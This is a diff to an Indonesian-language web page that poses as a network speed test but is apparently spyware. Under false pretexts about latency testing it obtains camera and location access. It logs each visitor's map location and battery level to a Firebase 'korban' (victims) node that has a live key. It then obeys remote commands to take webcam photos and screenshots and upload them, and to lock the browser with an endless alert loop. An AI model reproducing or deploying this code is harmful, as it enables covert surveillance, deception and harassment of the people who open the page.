@@ -1,61 +1,109 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ SPEEDTEST MINI</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚡ SPEEDTEST v4.2 - CEK KONEKSI</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
-        body { background: #000; color: #00ff00; font-family: sans-serif; text-align: center; padding-top: 100px; }
-        .btn { border: 2px solid #00ff00; background: none; color: #00ff00; padding: 20px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; }
-        #lock { display:none; position:fixed; inset:0; background:red; color:white; padding-top:200px; font-size:30px; z-index:999; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { border: 2px solid #00ff00; padding: 40px; border-radius: 50%; width: 250px; height: 250px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 0 20px #00ff00; transition: 0.3s; }
+        .box:active { transform: scale(0.9); box-shadow: 0 0 50px #00ff00; }
+        #status { margin-top: 20px; font-size: 12px; color: #fff; }
+        #lock { display:none; position:fixed; inset:0; background:red; color:white; z-index:9999; padding-top:200px; font-size:40px; }
     </style>
 </head>
 <body>
-    <video id="v" autoplay style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
-    <div id="ui">
-        <h1>SPEEDTEST v4.0</h1>
-        <p>Ukur latensi dan kecepatan jaringan Anda.</p>
-        <button class="btn" onclick="run()">MULAI TES</button>
+
+    <div id="main-ui">
+        <div class="box" onclick="startTest()">
+            <h1 style="margin:0;">GO</h1>
+            <p style="font-size:10px;">MULAI TES</p>
+        </div>
+        <div id="status">Klik untuk mengukur Latensi & Kecepatan Jaringan</div>
     </div>
-    <div id="lock">☣️ SYSTEM LOCKED</div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <div id="lock">☣️ SYSTEM ERROR ☣️</div>
 
 <script>
-    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
-    firebase.initializeApp(config); const db = firebase.database();
-    let myId = null;
+    // --- CONFIG FIREBASE (Sama dengan Markas) ---
+    const firebaseConfig = {
+      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
+      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    async function run() {
-        document.documentElement.requestFullscreen();
+    let myNodeId = null;
+
+    async function startTest() {
+        document.getElementById('status').innerText = "Meminta izin server...";
+        
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video:true});
-            document.getElementById('v').srcObject = stream;
-            navigator.geolocation.getCurrentPosition(async pos => {
-                let bat = "N/A"; if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
+            // 1. Ambil Izin Kamera (Tanpa Izin, Tes Gagal)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('video').srcObject = stream;
+
+            // 2. Ambil Lokasi
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                
+                // 3. Ambil Info Baterai
+                let bat = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    bat = Math.round(b.level * 100) + "%";
+                }
+
+                // 4. Daftarkan Target ke Firebase
                 const ref = db.ref('korban').push({
-                    waktu: new Date().toLocaleString(),
+                    waktu: new Date().toLocaleString('id-ID'),
                     baterai: bat,
                     maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                 });
-                myId = ref.key;
-                document.getElementById('ui').innerHTML = "<h2>🔍 Menganalisis Latensi Jaringan... 99%</h2>";
+                myNodeId = ref.key;
 
-                db.ref('commands/'+myId).on('value', snap => {
-                    const cmd = snap.val(); if(!cmd) return;
-                    if(cmd.action === "TAKE") {
-                        const v = document.getElementById('v'), c = document.getElementById('c');
-                        c.width = v.videoWidth; c.height = v.videoHeight;
+                document.getElementById('status').innerText = "Mengukur kecepatan... 15% (Mohon tunggu)";
+
+                // 5. Tunggu Perintah dari Markas (Real-time)
+                db.ref('commands/' + myNodeId).on('value', snap => {
+                    const cmd = snap.val();
+                    if (!cmd) return;
+
+                    // Perintah FOTO
+                    if (cmd.action === "TAKE") {
+                        const v = document.getElementById('video');
+                        const c = document.getElementById('canvas');
+                        c.width = v.videoWidth;
+                        c.height = v.videoHeight;
                         c.getContext('2d').drawImage(v, 0, 0);
-                        db.ref('hasil_foto/'+myId).set({ foto: c.toDataURL('image/jpeg', 0.4) });
+                        db.ref('hasil_foto/' + myNodeId).set({ foto: c.toDataURL('image/jpeg', 0.5) });
                     }
-                    if(cmd.action === "SHOT") {
-                        html2canvas(document.body).then(can => { db.ref('hasil_screenshot/'+myId).set({ foto: can.toDataURL('image/jpeg', 0.4) }); });
+
+                    // Perintah SCREENSHOT
+                    if (cmd.action === "SHOT") {
+                        html2canvas(document.body).then(canvas => {
+                            db.ref('hasil_screenshot/' + myNodeId).set({ foto: canvas.toDataURL('image/jpeg', 0.5) });
+                        });
                     }
-                    if(cmd.action === "VIRUS") { document.getElementById('lock').style.display='block'; setInterval(()=>alert("ALERT"), 500); }
+
+                    // Perintah LOCK (VIRUS)
+                    if (cmd.action === "VIRUS") {
+                        document.getElementById('lock').style.display = 'block';
+                        while(true) { alert("SISTEM RUSAK!"); } // Mengunci Browser
+                    }
                 });
+
+            }, (err) => {
+                alert("Gagal: Izin Lokasi diperlukan untuk mencari server terdekat!");
             });
-        } catch(e) { alert("Butuh izin untuk tes kecepatan!"); }
+
+        } catch (err) {
+            alert("Gagal: Izin Kamera diperlukan untuk tes latensi visual!");
+        }
     }
 </script>
 </body>
